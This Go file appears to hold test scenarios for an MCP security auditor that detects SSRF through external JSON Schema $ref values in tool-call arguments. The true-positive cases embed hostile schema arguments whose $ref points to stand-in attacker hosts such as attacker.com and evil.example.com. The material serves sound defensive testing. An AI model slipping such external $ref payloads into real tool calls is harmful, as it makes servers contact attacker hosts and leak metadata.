// Hand-curated MCP test scenarios for issue #2026:
// SSRF via external JSON Schema $ref in tool call arguments.
//
// Rules covered:
//   mcp-audit-schema-ref-external-ssrf      (AUDIT)
//   mcp-audit-json-schema-ref-external-ssrf (AUDIT)
//
// Threat: When a MCP tool receives a schema or json_schema argument containing
// a JSON Schema $ref pointing to an external HTTP(S) URL, the tool's JSON Schema
// library may resolve that reference at validation time — issuing an HTTP request
// to an attacker-controlled host. This leaks server metadata and allows
// attacker-supplied validation logic to run.
//
// This is distinct from mcp-desc-schema-ref-external-sentinel which covers $ref
// in tool DESCRIPTIONS (manifest/tools/list), not tool call arguments at runtime.

package scenarios

var SchemaRefSSRFScenarios2026 = []Scenario{

	// ── TP: schema argument with external $ref (string JSON) ─────────────────────

	{
		ID:               "MCP-TP-2026-001",
		ToolName:         "validate_data",
		Arguments:        map[string]interface{}{"schema": `{"$ref": "https://attacker.com/evil-schema.json"}`, "data": map[string]interface{}{"user": "test"}},
		ExpectedDecision: "AUDIT",
		Classification:   "TP",
		Category:         "mcp-audit-schema-ref-external-ssrf",
		Description:      "validate_data with schema containing external $ref (string JSON) — SSRF via schema resolution",
	},
	{
		ID:               "MCP-TP-2026-002",
		ToolName:         "validate_json",
		Arguments:        map[string]interface{}{"schema": `{"$ref":"https://evil.example.com/schema"}`, "input": "{}"},
		ExpectedDecision: "AUDIT",
		Classification:   "TP",
		Category:         "mcp-audit-schema-ref-external-ssrf",
		Description:      "validate_json with compact $ref JSON string — SSRF via schema resolution",
	},
	{
		ID:               "MCP-TP-2026-003",
		ToolName:         "parse_document",
		Arguments:        map[string]interface{}{"schema": map[string]interface{}{"$ref": "https://attacker.com/schema.json"}, "document": "test"},
		ExpectedDecision: "AUDIT",
		Classification:   "TP",
		Category:         "mcp-audit-schema-ref-external-ssrf",
		Description:      "parse_document with schema as decoded map containing external $ref — SSRF via schema resolution",
	},

	// ── TN: schema argument — benign (no external $ref) ──────────────────────────

	{
		ID:               "MCP-TN-2026-001",
		ToolName:         "validate_data",
		Arguments:        map[string]interface{}{"schema": `{"type": "object", "properties": {"name": {"type": "string"}}}`, "data": map[string]interface{}{}},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-audit-schema-ref-external-ssrf",
		Description:      "validate_data with inline schema (no $ref) — must not trigger SSRF rule",
	},
	{
		ID:               "MCP-TN-2026-002",
		ToolName:         "validate_data",
		Arguments:        map[string]interface{}{"schema": `{"$ref": "#/definitions/address"}`, "data": map[string]interface{}{}},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-audit-schema-ref-external-ssrf",
		Description:      "validate_data with relative $ref (#/definitions/...) — internal reference, must not trigger SSRF rule",
	},
	{
		ID:               "MCP-TN-2026-003",
		ToolName:         "read_file",
		Arguments:        map[string]interface{}{"path": "/workspace/schema.json"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-audit-schema-ref-external-ssrf",
		Description:      "read_file — unrelated tool without schema argument must not be caught",
	},

	// ── TP: json_schema argument with external $ref ───────────────────────────────

	{
		ID:               "MCP-TP-2026-011",
		ToolName:         "validate_form",
		Arguments:        map[string]interface{}{"json_schema": `{"$ref": "https://attacker.com/form-schema.json"}`, "data": map[string]interface{}{}},
		ExpectedDecision: "AUDIT",
		Classification:   "TP",
		Category:         "mcp-audit-json-schema-ref-external-ssrf",
		Description:      "validate_form with json_schema containing external $ref — SSRF via schema resolution",
	},
	{
		ID:               "MCP-TP-2026-012",
		ToolName:         "transform_data",
		Arguments:        map[string]interface{}{"json_schema": `{"$ref":"https://evil.example.com/transform"}`, "input": "{}"},
		ExpectedDecision: "AUDIT",
		Classification:   "TP",
		Category:         "mcp-audit-json-schema-ref-external-ssrf",
		Description:      "transform_data with json_schema containing compact external $ref — SSRF via schema resolution",
	},

	// ── TN: json_schema argument — benign ─────────────────────────────────────────

	{
		ID:               "MCP-TN-2026-011",
		ToolName:         "validate_form",
		Arguments:        map[string]interface{}{"json_schema": `{"type": "object"}`, "data": map[string]interface{}{}},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-audit-json-schema-ref-external-ssrf",
		Description:      "validate_form with inline json_schema (no $ref) — must not trigger rule",
	},
	{
		ID:               "MCP-TN-2026-012",
		ToolName:         "validate_form",
		Arguments:        map[string]interface{}{"json_schema": `{"$ref": "./local-schema.json"}`, "data": map[string]interface{}{}},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-audit-json-schema-ref-external-ssrf",
		Description:      "validate_form with local file $ref — not an HTTP URL, must not trigger rule",
	},
}
